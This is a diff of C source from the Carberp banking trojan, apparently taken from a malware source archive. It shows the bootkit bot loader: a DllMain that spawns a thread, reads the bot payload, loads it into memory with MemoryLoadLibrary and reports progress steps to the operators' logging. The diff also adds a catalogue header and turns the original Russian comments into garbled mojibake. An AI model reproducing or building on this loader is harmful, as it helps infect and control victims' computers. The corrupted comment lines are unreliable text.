@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "GetApi.h"
@@ -30,19 +41,19 @@ DWORD WINAPI StartRunBot(LPVOID Data)
 	
 	DisableShowFatalErrorDialog();
 
-	// Инициализируем систему отправки статистической информации
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DebugReportInit();
 
-	RunThread( SendLog, "701_pl" ); //запуск процесса
+	RunThread( SendLog, "701_pl" ); //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	DWORD c_data;
 	BYTE* data = ReadBotForBootkit(c_data);
 	if( data )
 	{
-		RunThread( SendLog, "702_pl" ); //считали бота
+		RunThread( SendLog, "702_pl" ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		MemoryLoadLibrary(data);
 		MemFree(data);
-		DebugReportStepByName("703_pl"); //запустили бот
+		DebugReportStepByName("703_pl"); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 	}
 	return 0;
 }
@@ -55,7 +66,7 @@ BOOL APIENTRY MyDllMain( HMODULE hModule,
 	{
 		case DLL_PROCESS_ATTACH:
 			BOT::InitializeApi();
-			PP_DPRINTF( "Старт загрузчика бота из буткита" );
+			PP_DPRINTF( "пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 			RunThread( StartRunBot, NULL );
 			break;
 		case DLL_THREAD_ATTACH:
